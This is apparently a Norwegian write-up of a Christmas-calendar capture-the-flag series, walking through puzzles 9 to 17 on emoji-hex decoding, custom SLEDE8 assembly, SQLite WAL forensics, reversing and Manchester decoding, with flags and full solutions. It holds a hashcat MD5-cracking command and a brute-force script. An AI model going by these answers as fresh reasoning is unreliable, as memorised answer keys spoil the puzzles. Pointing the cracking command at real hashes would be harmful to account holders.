ğŸ¤¶ğŸ›·âœ¨ğŸ¶ğŸ…âœ¨ğŸ…ğŸ…ğŸ›·ğŸ¤¶ğŸ„ğŸ”¥ğŸ†ğŸ¦ŒğŸğŸ›·ğŸ…â„ğŸ›·ğŸ›·ğŸ…ğŸ¶ğŸ…âœ¨ğŸ…ğŸ¦ŒğŸ¥£ğŸ”¥ğŸ›·ğŸ¦Œâ›„ğŸ…ğŸŒŸğŸ›·ğŸ›·ğŸ”¥ğŸ„ğŸ¦ŒğŸ…âœ¨ğŸ¦ŒğŸ¦ŒğŸ•¯ğŸ¶ğŸ…ğŸ¤¶ğŸ¦Œâ„ğŸğŸ•¯ğŸ…âœ¨ğŸ¶ğŸ‘¼ğŸŒŸğŸ†ğŸ•¯ğŸŒŸâ„ğŸ‘¼ğŸ…ğŸ…ğŸ¤¶â„ğŸ„ğŸ‘¼ğŸ†ğŸ”¥ğŸğŸ›·ğŸ¤¶ğŸ‘¼ğŸ…ğŸ…ğŸ…ğŸ…ğŸ…ğŸ…

16 ulike emojis i starten tydet pÃ¥ hex-verdier 0-F. Oversatte man ğŸ… til 0, ğŸ¤¶ til 1 osv, fikk man fÃ¸lgende streng:
```
0123456789ABCDEF1F8B0800F149CE5F02FF0B080EA9FE307FF94E08EE6B01E25608BD7C672D00124DC95F1D000000
```
Fjernet man starten og slutten, satt vi igjen med
```
1F8B0800F149CE5F02FF0B080EA9FE307FF94E08EE6B01E25608BD7C672D00124DC95F1D
```
Googler man `1F8B08` ser man at det er filsignaturen for gzip. Med Python lÃ¸ses det slik:

```Python
import gzip

data = "ğŸ…ğŸ¤¶â„â›„ğŸ„ğŸğŸ•¯ğŸŒŸâœ¨ğŸ”¥ğŸ¥£ğŸ¶ğŸ†ğŸ‘¼ğŸ¦ŒğŸ›·ğŸ¤¶ğŸ›·âœ¨ğŸ¶ğŸ…âœ¨ğŸ…ğŸ…ğŸ›·ğŸ¤¶ğŸ„ğŸ”¥ğŸ†ğŸ¦ŒğŸğŸ›·ğŸ…â„ğŸ›·ğŸ›·ğŸ…ğŸ¶ğŸ…âœ¨ğŸ…ğŸ¦ŒğŸ¥£ğŸ”¥ğŸ›·ğŸ¦Œâ›„ğŸ…ğŸŒŸğŸ›·ğŸ›·ğŸ”¥ğŸ„ğŸ¦ŒğŸ…âœ¨ğŸ¦ŒğŸ¦ŒğŸ•¯ğŸ¶ğŸ…ğŸ¤¶ğŸ¦Œâ„ğŸğŸ•¯ğŸ…âœ¨ğŸ¶ğŸ‘¼ğŸŒŸğŸ†ğŸ•¯ğŸŒŸâ„ğŸ‘¼ğŸ…ğŸ…ğŸ¤¶â„ğŸ„ğŸ‘¼ğŸ†ğŸ”¥ğŸğŸ›·ğŸ¤¶ğŸ‘¼ğŸ…ğŸ…ğŸ…ğŸ…ğŸ…ğŸ…"

pst_dict = {
    'ğŸ…': '0',
    'ğŸ¤¶': '1',
    'â„': '2',
    'â›„': '3',
    'ğŸ„': '4',
    'ğŸ': '5',
    'ğŸ•¯': '6',
    'ğŸŒŸ': '7',
    'âœ¨': '8',
    'ğŸ”¥': '9',
    'ğŸ¥£': 'A',
    'ğŸ¶': 'B',
    'ğŸ†': 'C',
    'ğŸ‘¼': 'D',
    'ğŸ¦Œ': 'E',
    'ğŸ›·': 'F',
}

res = ''

for emoji in data:
    res = res + pst_dict[emoji]

print("Hex:", res)
print("LÃ¸sning:", gzip.decompress(bytes.fromhex(res[16:94])).decode('utf-8'))
```

**LÃ¸sning: PST{ğŸ§¹ğŸ§¹ğŸ„ğŸ…ğŸ„ğŸ§¹}**

## Eggedosis

Det var et egg i dag ogsÃ¥. FÃ¸rst kom en "tjenestepakke" som man mÃ¥tte klikke pÃ¥ en knapp veldig mange ganger for Ã¥ installere. Eventuelt ta opp konsollet i [Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools) og kjÃ¸re

```javascript
var i;for (i=0; i<50; i++) {document.getElementsByTagName('button')[3].click();}
```
NÃ¥r tjenestepakken var installert, dukket det opp et nytt verktÃ¸y, "Mal": 
!["mal"](../pics/pst_9_mal.png)

Fra `Hjelp`-menyen kunne man velge `Ã…pne Mal 3D (x86)`. Der kom man til en blÃ¥skjerm med noen assembly-instruksjoner
```
inc ebp
inc edi
inc edi
jnp $+0x7a
cmp [esi],dh
pop edi
insd
popad
arpl [eax+0x69],bp
outsb
inc ebp
pop edi
arpl [edi+0x64],bp
inc ebp
jb $+0x7f
```

Tok denne koden inn i https://defuse.ca/online-x86-assembler.htm og assemblet den. Resultatet ble `4547477B7838365F6D616368696E455F636F6445727D`

```
$ echo 4547477B7838365F6D616368696E455F636F6445727D | xxd -r -p
EGG{x86_machinE_codEr}
```

**Utmerkelse #6: EGG{x86_machinE_codEr}**

# 10 - SLEDE8, hex til ASCII
> HÃ¥per du er klar for nye utfordringer i SLEDE8. Fint hvis du rapporterer tilbake med verifikasjonskoden nÃ¥r du har lÃ¸st e-lÃ¦ringsmodulen med kode 82ec70284b51eb12. 

Det var dags for mer [SLEDE8](https://slede8.npst.no/). Det skulle skrives ut summen av to tall, A og B, som en ASCII-streng. Det vanskelige i denne oppgaven var Ã¥ gjÃ¸re om fra hex til ASCII og det ble klassisk [spaghetti-kode](https://en.wikipedia.org/wiki/Spaghetti_code).
```
; FÃ¸de bestÃ¥r av to tall, A og B
; Skriv ut resultatet av (A + B) mod 256 som en ASCII-streng

; Eksempel: A=0xA0 og B=0x08 => '168'
; Eksempel: A=0xFF og B=0xFF => '254'
LES r0
LES r1
PLUSS r0,r1

SETT r1, 1
SETT r2, 10
SETT r3, 100
SETT r4, 200
SETT r8, 0x30 ; utskrift 100
SETT r9, 0x30 ; utskrift 10
SETT r10, 0x30 ; utskrift 1
SETT r11, 2
SETT r12, 0x30; base

hundre:
ME r0,r3
BHOPP ti
SEL r0,r4
BHOPP tohundre
PLUSS r8,r1
SKRIV r8
MINUS r0,r3
HOPP ti

tohundre:
PLUSS r8,r11
SKRIV r8
MINUS r0,r4

ti:
ME r0,r2; det er tomt for tiere
BHOPP skrivtier 
PLUSS r9,r1; stege opp en for tierutskrift
MINUS r0,r2; trekke fra 10
HOPP ti; tilbake i lÃ¸kka

skrivtier: 
LIK r9,r12 ;om r9 er 30 skal det bare skrives ut om r8 ulik 30
BHOPP sjekkomdetalleredeerskrevethundre
HOPP skrivtierforsure

sjekkomdetalleredeerskrevethundre:
ULIK r8,r12
BHOPP skrivtierforsure
HOPP en

skrivtierforsure:
SKRIV r9
HOPP en

en:
ME r0,r1; det er tomt for enere
BHOPP skrivener
PLUSS r10,r1; stege opp en for enerutskrift
MINUS r0,r1; trekke fra 1
HOPP en; tilbake i lÃ¸kka

skrivener:
SKRIV r10
STOPP
```

**LÃ¸sning: PST{++AndKissesWillBeAwardedToYou}**

## EggerÃ¸re
Etter at lÃ¸sningen var levert, fikk man nok en e-lÃ¦ringsmodul, `8e7c9876c85e5471`, som mÃ¥tte lÃ¸ses for Ã¥ fÃ¥ et egg. Egentlig samme logikk, mÃ¥tte bare holde ting mer i minne. Enda mer spaghetti-kode ga egget (nÃ¥r jeg ser pÃ¥ koden 14 dager etter, skjÃ¸nner jeg ingenting av den og kan ikke fatte at den lÃ¸ser noe som helst ğŸ˜® ).

```
; FÃ¸de bestÃ¥r av to tall, A og B
; Skriv ut resultatet av A + B som en ASCII-streng

; Eksempel: A=0xA0 og B=0x08 => '168'
; Eksempel: A=0xFF og B=0xFF => '510'


; FÃ¸de bestÃ¥r av to tall, A og B
; Skriv ut resultatet av (A + B) mod 256 som en ASCII-streng

; Eksempel: A=0xA0 og B=0x08 => '168'
; Eksempel: A=0xFF og B=0xFF => '254'
LES r0
LES r15

SETT r1, 1
SETT r2, 10
SETT r3, 100
SETT r4, 200
SETT r5, 0x3a ; grense for overflow
SETT r8, 0x30 ; utskrift 100
SETT r9, 0x30 ; utskrift 10
SETT r10, 0x30 ; utskrift 1
SETT r11, 2
SETT r12, 0x30; base

hundre:
ME r0,r3
BHOPP hundre2
SEL r0,r4
BHOPP tohundre
PLUSS r8,r1
;SKRIV r8
MINUS r0,r3
HOPP hundre2

tohundre:
PLUSS r8,r11
;SKRIV r8
MINUS r0,r4

hundre2:
ME r15,r3
BHOPP ti
SEL r15,r4
BHOPP tohundre2
PLUSS r8,r1
;SKRIV r8
MINUS r15,r3
HOPP ti

tohundre2:
PLUSS r8,r11
;SKRIV r8
MINUS r15,r4

ti:
ME r0,r2; det er tomt for tiere
BHOPP ti2
PLUSS r9,r1; stege opp en for tierutskrift
MINUS r0,r2; trekke fra 10
HOPP ti; tilbake i lÃ¸kka

ti2:
ME r15,r2; det er tomt for tiere
BHOPP skrivtier2 
PLUSS r9,r1; stege opp en for tierutskrift
MINUS r15,r2; trekke fra 10
HOPP ti2; tilbake i lÃ¸kka

skrivtier2: 
LIK r9,r12 ;om r9 er 30 skal det bare skrives ut om r8 ulik 30
BHOPP sjekkomdetalleredeerskrevethundre2
HOPP skrivtierforsure2

sjekkomdetalleredeerskrevethundre2:
ULIK r8,r12
BHOPP skrivtierforsure2
HOPP en

skrivtierforsure2:
;SKRIV r9
HOPP en

en:
ME r0,r1; det er tomt for enere
BHOPP en2
PLUSS r10,r1; stege opp en for enerutskrift
MINUS r0,r1; trekke fra 1
HOPP en; tilbake i lÃ¸kka

en2:
ME r15,r1; det er tomt for enere
BHOPP avslutt
PLUSS r10,r1; stege opp en for enerutskrift
MINUS r15,r1; trekke fra 1
HOPP en2; tilbake i lÃ¸kka

avslutt:
; mÃ¥ sjekke om det er overflow pÃ¥ 10 og 1
SEL r9,r5; overflow pÃ¥ 10?
BHOPP tellopphundre
SEL r10,r5; overflow pÃ¥ 1;
BHOPP telloppti
HOPP skrivhundre

tellopphundre:
PLUSS r8,r1
MINUS r9,r2
SEL r10,r5; overflow pÃ¥ 1;
BHOPP telloppti
HOPP skrivhundre

telloppti:
PLUSS r9,r1
MINUS r10,r2

skrivhundre:
SKRIV r8

skrivtier:
SKRIV r9

skrivener:
SKRIV r10
STOPP
```

**Utmerkelse #7: EGG{ba92ae3a9af1a157703ca83d9a9fb11d}**

# 11 - SQLite og WAL-filer
> Det interne sikkerhetsteamet hos NPST har oppdaget at det har skjedd en uautorisert modifikasjon pÃ¥ Nissens liste over snille og slemme barn. De pÃ¥stÃ¥r at en md5-sum har blitt endret pÃ¥, men de trenger din hjelp til Ã¥ finne ut nÃ¸yaktig hvilken. Vedlagt ligger en sikkerhetskopi med nissens liste fra det tidspunktet sikkerhetsteamet mener modifikasjonen har oppstÃ¥tt.

Utdelt var en [SQLite](https://www.sqlite.org/index.html)-database, `liste.db`. Sammen med denne, kom en [wal-fil](https://sqlite.org/wal.html). En wal-fil er en "write-ahead log" som hÃ¥ndterer commit og rollback, et mellomlagringssteg fÃ¸r data enten blir skrevet til databasen, eller rullet tilbake. 

Siden [Sanderson Forensics-verktÃ¸yene](https://sqliteforensictoolkit.com/) er lisensbelagt, mÃ¥tte det en del manuell behandling til. Kopierte `liste.db` til `liste_uten_wal.db` og Ã¥pnet denne i [SQLite Browser](https://sqlitebrowser.org/). Kopierte innholdet og limte det inn i Excel (kremt...). Ã…pnet deretter `liste.db` med den aktive wal-fila og kopierte ogsÃ¥ innholdet inn i samme Excel-regneark. Fikk Excel til Ã¥ "Remove Duplicates", som da viste at det var pluss ett innslag i `snille`-listen. Sorterte listen pÃ¥ navn og fant ut hvilket navn som hadde to forekomster i listen. Det var `Agnes Brekke 49422712408d5409a3e40945204314e6`. Dette var da flagget.

**LÃ¸sning: PST{49422712408d5409a3e40945204314e6}**

ForsÃ¸kte ogsÃ¥ hashcat pÃ¥ den MD5-summen, uten at det ga noe mer
```bash
$ hashcat -m 0 -O -r OneRuleToRuleThemAll.rule agnesbrekke_md5.txt mine_passord.txt
```
# 12 - SLEDE8, reversing
> Det rapporteres at SydpolarSikkerhetstjeneste (SPST) i starten av desember hadde publisert s8asm-kode fra sin GitHub-bruker. Dette ble raskt fjernet, men din kollega Tastefinger rakk Ã¥ sikre kildekoden.
> Vi stiller oss spÃ¸rrende til hvordan de har fÃ¥tt tak i spesifikasjonen til dette sprÃ¥ket. HR fÃ¸lger opp hvem som har sluttet ila det siste Ã¥ret, og hvorvidt noen av disse kan ha delt denne informasjonen til SPST.
> I mellomtiden har jeg jobbet iherdig med Ã¥ montere koden. Klarer du Ã¥ forstÃ¥ hva SPST vil med dette? Jeg ser frem til verdifull input fra deg!
> Se vedlagt fil for den monterte koden. Tastefinger mente det var relevant Ã¥ fortelle at du kan finne nyttige verktÃ¸y [her](https://github.com/PSTNorge/slede8).

Dagens oppgave var nok et besÃ¸k hos [SLEDE8](https://slede8.npst.no/). BinÃ¦rfila inneholdt noe lesbart: 

`.SLEDE8Qaï¿½ï¿½ï¿½ï¿½ï¿½rUg%r%2,Rbeï¿½Uï¿½ï¿½ï¿½ï¿½)ï¿½#QQW~ndwY8ï¿½H=ï¿½S}!\ï¿½ï¿½P%U?Korrekt!Feil!ï¿½ï¿½Uï¿½`.   

Jeg klonet [github-repoet](https://github.com/PSTNorge/slede8) og begynte Ã¥ kikke pÃ¥ koden der. Det var [TypeScript](https://www.typescriptlang.org/), [Node.js](https://nodejs.org/en/) og [Jest](https://jestjs.io/) for testing. Fikk det til slutt Ã¥pnet i [IntelliJ](https://www.jetbrains.com/idea/) og fikk til Ã¥ kjÃ¸re tester lokalt. For Ã¥ fÃ¥ til det mÃ¥tte jeg gjÃ¸re fÃ¸lgende:

- legge til `testEnvironment: 'node'`, i `jest.config.js`
- lage en ny Run/Debug Configuration for npm med command `run` og scripts `test`. Mulig det steget ikke var nÃ¸dvendig, men fikk ikke satt opp IntelliJ for Ã¥ kunne kjÃ¸re `step()`-metoden ellers. MÃ¥tte ty til `npm run test` fra kommandolinja fÃ¸r det

Det viste seg i `runtime.ts` at metoden `load()` lastet den binÃ¦re fila inn i minnet, og at den sjekket for `magic` som var `.SLEDE8` i starten pÃ¥ fila. Alt etter `.SLEDE8` kunne kjÃ¸res rett inn i SLEDE8 som `.DATA`, slik

```
.DATA 81, 0, 97, 1, 161, 0, 177, 1, 193, 0, 131, 3, 145, 26, 6, 2, 4, 3, 114, 5, 85, 103, 37, 114, 37, 50, 21, 44, 82, 6, 98, 7
.DATA 101, 185, 85, 176, 23, 169, 233, 0, 7, 172, 41, 3, 179, 5, 26, 6, 0, 0, 35, 5, 26, 6, 0, 0, 81, 81, 87, 126, 110, 100, 119, 18
.DATA 89, 56, 243, 138, 72, 61, 235, 83, 125, 33, 92, 175, 28, 174, 80, 37, 85, 63, 75, 111, 114, 114, 101, 107, 116, 33, 0, 70, 101, 105, 108, 33
.DATA 0, 4, 2, 7, 162, 217, 6, 22, 2, 85, 176, 24, 6, 11, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
```

KjÃ¸rte programmet i SLEDE8 med diverse fÃ¸de, som alle ga oppgulp `Feil!`. Det var Ã¥penbart at riktig fÃ¸de ville gi oppgulp `Korrekt!`, men hva var riktig fÃ¸de? Begynte Ã¥ debugge `step()`-metoden som inneholdt alt som var av interesse. Det skjedde mye med registerne, og jeg forsÃ¸kte fÃ¸rst Ã¥ disassemble SLEDE8-koden. Endte opp med

```
SETT r5,0
SETT r6,1
SETT r10,0
SETT r11,1
SETT r12,0
SETT r1,0
SETT r0,56
SETT r9,26
LES r2
...
```
384-ish rader med ASM-kode. En lÃ¸kke som begynte med `LES r2` gjentok seg 26 ganger, sÃ¥ det tydet pÃ¥ at programmet Ã¸nsket 26 bokstaver i input. Men hva skulle til for Ã¥ fÃ¥ koden til Ã¥ skrive ut `Korrekt!`? Det var mye manipulering av registre, og etter litt prÃ¸ving og feiling viste det seg at alt hang pÃ¥ `r12`. Dersom `r12==0` til slutt, skrives `Korrekt!`. Alt annet ga `Feil!`. `wat` fant ut at `PST{` i starten ogsÃ¥ ga `r12==0` til slutt. Da var det egentlig bare Ã¥ brute-force seg fram til resten av lÃ¸sningen. `wat` skrev det meste av denne koden.
	
```TypeScript
let file = fs.readFileSync('program.s8');
let encoder = new TextEncoder();
let prefix = 'PST{';
const alphabet = [...'abcdefghijklmnopqrstuvwxyzÃ¦Ã¸Ã¥ABCDEFGHIJKLMNOPQRSTUVWXYZÃ†Ã˜Ã…0123456789{}-_!+'];
let val;
for (let i = 0; i < alphabet.length; i++) {
    let input = prefix + alphabet[i];
    const generator = step(file, encoder.encode(input));
    do {
        try {
            val = generator.next();
        } catch (error) {
            break;
        }
    } while (!val.done);
    if (val?.value.regs[12] == 0) {
        prefix += alphabet[i];
        if (prefix.length == 26) {
            break;
        }
        i = -1;
    }
}
console.log(prefix)
```

KjÃ¸rte den mot `step()`-funksjonen som umiddelbart ga lÃ¸sningen   

**LÃ¸sning: PST{fib0nacc1_0net1m3_p4d}**

## Eggeskall
Som om ikke dagens oppgave var nok, kom det et egg ogsÃ¥. Nok et program i SLEDE8 som skulle undersÃ¸kes. KjÃ¸rte bare samme opplegg som forrige oppgave og oppdaget at programmet skrev ut enten `Feil :(` eller `Correctamundo!`. Tenkte at det nok en gang var et register som mÃ¥tte vÃ¦re 0 for at `Correctamundo!` skulle skrives ut. Manipulerte `step()`-funksjonen og fant ut at `r8==0` var det som mÃ¥tte til (satt `r8=0` eksplisitt i `step()`). Det skulle ikke veldig mye fantasi til for Ã¥ skjÃ¸nne at lÃ¸sningen denne gang begynte med `EGG{`. Brute-force med ca. samme kode som over ga lÃ¸sningen

**Utmerkelse #8: EGG{513d38_master_reverser}**

Kunne ogsÃ¥ kjÃ¸re denne direkte i slede8 med fÃ¸lgende:
```
.DATA 177,1,40,9,100,235,240,64,25,67,48,192,244,81,155,253,188,23,144,97,38,141,63,78,73,220,179,45,185,224,89,220
.DATA 71,65,220,81,170,48,91,100,201,226,65,71,67,71,68,251,68,20,19,69,72,20,241,100,104,84,217,36,246,86,230,99
.DATA 68,152,67,251,68,69,72,100,104,84,217,70,233,24,68,226,73,219,71,65,65,242,70,219,71,65,65,115,67,0,66,116
.DATA 3,0,68,4,2,84,115,74,65,100,235,240,64,69,67,70,227,216,70,87,67,20,241,153,71,74,65,2,46,51,51,36
.DATA 34,53,32,44,52,47,37,46,96,65,7,36,40,45,97,123,105,65,49,153,8,11,12,49,65,200,9,0,35,9,66,0
.DATA 67,0,4,2,37,50,20,2,85,176,23,64,41,10,72,0,120,9
```

# 13 - ASCII-art
> FÃ¸lgende melding ble tilsendt NPST per faks, og ingen i postmottaket forstÃ¥r innholdet. Det ser ut som den bruker en eller annen form for hex-enkoding, men selv hex-dekodet gir faksen ingen mening. Klarer du Ã¥ finne mening i meldingen?

Dersom man myste godt pÃ¥ den tekstfila som var vedlagt, kunne man ane bokstaver der. Ã…penbar ASCII-art. Masse mysing til det gjorde vondt i Ã¸ya ga lÃ¸sningen. Eventuelt kunne man gjÃ¸re `sed -E 's/[12357CEF]/ /g' melding.txt`, som ga lÃ¸sningen i et mer lettlest format (for den observante, har alle tegn som gjenstÃ¥r en _lukket slÃ¸yfe_ i seg. Slike tegn har kanskje et navn?) :

```
 9004    086B  8A696    40    9664  9   8  D666D   6A8   B   0  B   A         00968  9       6D8    4A0          864B4   8B4B          4BBA  8   0  4664D   9A4   9   B  B   9  D  A
 B   B  A        0     A  4  6      6A  6  6      9   8  6   4  4   9         D      9      9   6  B   8           4    D             4      4B  4  9      4   D  9   9  0   B     0
 8   6  0        B     A     D      A 9 0  D      8   9  6  8   9   A         D      B      9   0  D               4    9             0      D 4 B  0      6   B  A  6   A   9     6
 ADB6    8B9     4    A       BD6   6  B0  D40    4   A  660     8 8          A99    B      4   D  D 40B           8     A4B           086   9  4D  00A    6   9  A90     6 0       6
 B          4    8     8         A  0   B  4      D00DA  D  0     0           A      A      69B6A  8   4           A        9             9  8   0  9      A0498  9  B     B       6
 A          B    9     6  4      9  B   4  4      4   A  4   B    8           A      9      8   0  B   4           A        0             A  4   4  A      B   A  4   6    6       A
 0      DB9D     4      9D   0898   8   4  A89BA  9   8  0   A    A    68940  6      8D868  6   8   ABD   064D8  44804  4B44   D9D64  AAD9   4   6  4A8A4  6   D  4   B    A    9  6
```

**LÃ¸sning: PST{SNEAKY_FLAG_IS_SNEAKY}**

# 14 - SLEDE8, rekkefÃ¸lge
> Det nyeste innen mÃ¥ltallsrapportering er antall fullfÃ¸rte e-lÃ¦ringsmoduler i SLEDE8 blandt de ansatte, sÃ¥ kunne du gjennomfÃ¸rt modul 97672649875ca349? Rapporter tilbake som vanlig nÃ¥r du er ferdig!

Nok en SLEDE8 oppgave. Her gjaldt det Ã¥ holde tunga rett i munnen nÃ¥r man lagret verdier til registre. En adresse lagres over to registre, `r0` og `r1`. Der `r1` har den mest signifikante biten. Det tok tid Ã¥ komme seg forbi alle testene pÃ¥ serveren, spesielt test 6. Siden man ikke visste hva test 6 var, mÃ¥tte man bare prÃ¸ve seg fram. Viste seg at versjon 1 av mitt program ikke klarte Ã¥ hÃ¥ndtere fÃ¸de > 512 tegn. Grunnen til det var at jeg i utgangspunktet hadde en teller som telte antall lagringer, og en teller som telte antall utskrifter. NÃ¥r disse var like, var programmet ferdig. Problemet var at disse verdiene ble lagret i et register som bestod av 1 byte, og kunne sÃ¥ledes kun telle opp til 255. Ved Ã¥ sette fÃ¸rste byte i `.DATA 0x00` og sjekke pÃ¥ det nÃ¥r man telte ned igjen, kom man i mÃ¥l.
```
; FÃ¸de bestÃ¥r av et ukjent antall verdier, der verdien 0x00 markerer siste verdi.
; Skriv ut verdiene i motsatt rekkefÃ¸lge.

; Eksempel: 11223344556600 => 665544332211
; Eksempel: 0123456789abcdef00 => efcdab8967452301
FINN data; placeholder for hvor fÃ¸de skal leses inn i minnet
SETT r10,0; konstant for Ã¥ sammenligne
SETT r11,1; konstant for Ã¥ telle
SETT r15,0xff; maks i et minne

les_neste_verdi:
LES r2
LIK r2,r10
BHOPP skriv_ut
LIK r0,r15; er r0 full?
BHOPP tell_opp_r1
PLUSS r0,r11; else tell opp r0
LAGR r2; lagre i gjeldende adresse r1r0
HOPP les_neste_verdi

tell_opp_r1:
SETT r0,0; r0 starter pÃ¥ 00 igjen
PLUSS r1,r11; tell opp r1
LAGR r2; lagre i gjeldende adresse r1r0
HOPP les_neste_verdi

skriv_ut:
LAST r2
LIK r2,r10; r2 har nÃ¥dd starten pÃ¥ .DATA. Vi er ferdige
BHOPP slutt
SKRIV r2
LIK r0,r10; nÃ¥dd starten pÃ¥ r0?
BHOPP tell_ned_r1
MINUS r0,r11
HOPP skriv_ut

tell_ned_r1:
SETT r0,0xff; r0 starter pÃ¥ ff igjen
MINUS r1,r11
HOPP skriv_ut

slutt:
STOPP

data:
.DATA 0x00
```
**LÃ¸sning: PST{InReverseCountryEverythingIsPossible}**

## Posjert egg
Samme kode gikk for egget, som jeg tror baserte seg pÃ¥ at koden mÃ¥tte vÃ¦re sÃ¥ kompakt som mulig og ikke overstige et visst antall sykler.   

**Utmerkelse #9: EGG{5f5fc8819e2cc6be9c6a19370a5030af}**

# 15 - Manchester code
> I etterkant av en privat reise (tidligere i Ã¥r) for Ã¥ se fotball i England, har en av alvebetjentene flere ganger fanget opp et mystisk signal. Det ser ut som signalet er ganske kontinuerlig, men det varierer litt i frekvens. Denne oppgaven har ligget i backloggen hos oss, men det hadde vÃ¦rt veldig fint om du kan ta en titt og se om det er en beskjed i signalet!

Vedlagt var en fil, `data2.complex16u`.
```bash
$ file data2.complex16u
data2.complex16u: RDI Acoustic Doppler Current Profiler (ADCP)
```
Referansen til fotballtur kunne tyde pÃ¥ at det handlet om [Manchester code](https://en.wikipedia.org/wiki/Manchester_code). Ã…pnet fila i [URH](https://github.com/jopohl/urh) og der finnes jammen en mulighet til Ã¥ dekode Manchester, under fanen for `Analysis`.  ASCII-representasjonen av `Manchester II`-dekoding ga flagget. (Antar at 2. laget til Manchester egentlig betyr Manchester City, mens 1. laget selvsagt er United).

**LÃ¸sning: PST{m4nch3st3r_3nc0d1ng_1s_4_l0t_0f_fun!}**

# 16 - SLEDE8, sortering
> Jeg ligger fortsatt litt bakpÃ¥ mÃ¥ltallsmessig etter 'svar alle'-hendelsen tidligere i mÃ¥neden. Det er nok derfor best for din lÃ¸nnsutvikling om du gjennomfÃ¸rer e-lÃ¦ringsmodul a522c5a55bcb743e i SLEDE8.

Mer SLEDE8 i dagens oppgave der man skulle sortere en liste med tall. LÃ¸ste denne med [Bubble sort](https://en.wikipedia.org/wiki/Bubble_sort). Begynte Ã¥ fÃ¥ litt mer dreis pÃ¥ SLEDE8 og litt mindre spaghetti enn tidligere
```
; FÃ¸rste byte med fÃ¸de er et tall N som representerer
; antallet pÃ¥fÃ¸lgende bytes med fÃ¸de.
; de pÃ¥fÃ¸lgende verdiene representerer en liste med verdier.
; skriv ut verdiene i lista sortert i stigende rekkefÃ¸lge

; Eksempel: 06112233445566 => 112233445566
; Eksempel: 06665544332211 => 112233445566

; OBS: Implementasjonen kan ikke benytte mer enn (24* N^2 + 5000) skritt.
; OBS: Du kan endre maks antall skritt lokalt ved Ã¥ skrive localStorage.setItem('ğŸš²', 10000000)

SETT r1, 50; MSB for minnelesing, 50 er et fint tall
SETT r0, 0; LSB for minnelesing
SETT r11,1; konstant for Ã¥ telle
SETT r12,0; konstant for 0
SETT r15,1; flagg om vi er ferdig sortert, 0=true, 1=false

LES r10; les fÃ¸rste verdi som sier noe om stÃ¸rrelsen pÃ¥ listen

les_neste_verdi:
LES r2
LAGR r2; lagre i gjeldende adresse r1r0
PLUSS r0,r11; pek pÃ¥ neste minneomrÃ¥de vi skal lagre til
LIK r0,r10; r0 (antall lagret) == r10 (stÃ¸rrelsen pÃ¥ listen), vi er ferdige
BHOPP nullstill_minne_for_sortering
HOPP les_neste_verdi

nullstill_minne_for_sortering:
LIK r15,r12; vi er ferdige med sortering
BHOPP nullstill_minne_for_utskrift
SETT r0, 0; LSB for minnelesing
SETT r15,0; flagg om vi er ferdig sortert

sorter:
LAST r2; fÃ¸rste tall Ã¥ sammenligne
PLUSS r0,r11; peke pÃ¥ neste minneplass
LAST r3; andre tall Ã¥ sammenligne
PLUSS r0,r11; peke pÃ¥ neste minneplass
ME r3,r2; r3 og r2 mÃ¥ bytte plass
BHOPP swap

fortsett:
LIK r0,r10; r0 (antall lest) == r10 (stÃ¸rrelsen), vi er ferdige denne runden; fÃ¥r ikke gÃ¥ over FF her
BHOPP nullstill_minne_for_sortering
MINUS r0,r11; steg ned et steg
HOPP sorter

swap:
SETT r15,1; vi er ikke ferdig sorterte
MINUS r0,r11; steg ned et steg
LAGR r2; lagre r3 til den siste adressen
MINUS r0,r11; steg ned et steg
LAGR r3;
PLUSS r0,r11
HOPP fortsett

nullstill_minne_for_utskrift:
SETT r0, 0; LSB for minnelesing

skriv_ut:
LAST r2
SKRIV r2
PLUSS r0,r11
LIK r0,r10; antall skrevet ut = stÃ¸rrelsen pÃ¥ listen
BHOPP slutt
HOPP skriv_ut

slutt:
STOPP
```

**LÃ¸sning: PST{youtu.be/k4RRi_ntQc8}**

## Eggedal
Egget var selvsagt samme oppgave, men man fikk bare bruke 4608 sykler. Litt tungt, nÃ¥r bubble sort fra oppgaven brukte nesten 897.000 sykler. SÃ¥ mÃ¥tte tenke helt nytt. Etter noen hint her og der, viste det seg at den beste lÃ¸sningen var Ã¥ bruke minnet som en map, der adressen er en `key` og antall forekomster er `value`. Om man begynner pÃ¥ adressen `0x00` og steger oppover, har man lista automatisk sortert ogsÃ¥. Funker siden det er maks `0xFF` forekomster i lista. FÃ¸rste implementasjon krevde ca. 6900 sykler. Etter gradvis optimalisering og omveltning av logikk (f.eks. bytte `LIK` til `ULIK`), klarte koden Ã¥ kjÃ¸re pÃ¥ under det pÃ¥krevde antall sykler.

```
; FÃ¸rste byte med fÃ¸de er et tall N som representerer
; antallet pÃ¥fÃ¸lgende bytes med fÃ¸de.
; de pÃ¥fÃ¸lgende verdiene representerer en liste med verdier.
; skriv ut verdiene i lista sortert i stigende rekkefÃ¸lge

; Eksempel: 06112233445566 => 112233445566
; Eksempel: 06665544332211 => 112233445566

; OBS: Implementasjonen kan ikke benytte mer enn 4608 skritt.
SETT r1,42; MSB for minnelesing, 42 er et fint tall
SETT r11,1; konstant for Ã¥ telle
SETT r12,0; konstant. Egentlig unÃ¸dvendig, men grei Ã¥ eksplisitt deklarere

LES r10; les fÃ¸rste verdi som sier noe om stÃ¸rrelsen pÃ¥ lista

les_neste_verdi:
LES r0; fra fÃ¸de
LAST r2; last antall fra den adressen
PLUSS r2,r11; legg til 1 i antall fra den adressen
LAGR r2; lagre i gjeldende adresse r1r0
MINUS r10,r11; stÃ¸rrelsen pÃ¥ lista subtraheres med 1
ULIK r12,r10; om vi har lest r10 ganger mÃ¥ vi gÃ¥ videre
BHOPP les_neste_verdi

SETT r0,0

skriv_ut:
LAST r2
LIK r2, r12; trenger ikke skrive ut
BHOPP pluss_r0

skriv_register:
SKRIV r0; skriv ut fÃ¸de, men er det fler?
MINUS r2,r11
ULIK r2,r12
BHOPP skriv_register

pluss_r0:
PLUSS r0,r11
ULIK r0,r12
BHOPP skriv_ut
```

**Utmerkelse #10: EGG{a34ae56d455e16b08cfe07f585ed44d9}**

# 17 - ASN.1, del 2
> NPST har avlyttet telefonen til en mistenkt etteretningsoffiser fra SPST. TeleoperatÃ¸ren har oversendt data i henhold til ETSI232-1, men vÃ¥re systemer klarer ikke Ã¥ forstÃ¥ innholdet. Vi mistenker at det er benyttet en svÃ¦rt enkel kode, men vÃ¥re analytikere sier det er LITE SANNSYNLIG at XMAS er benyttet.

Dagens tema var igjen [ASN.1](https://en.wikipedia.org/wiki/ASN.1), som luke 8. En ny spesifikasjon i dag

```
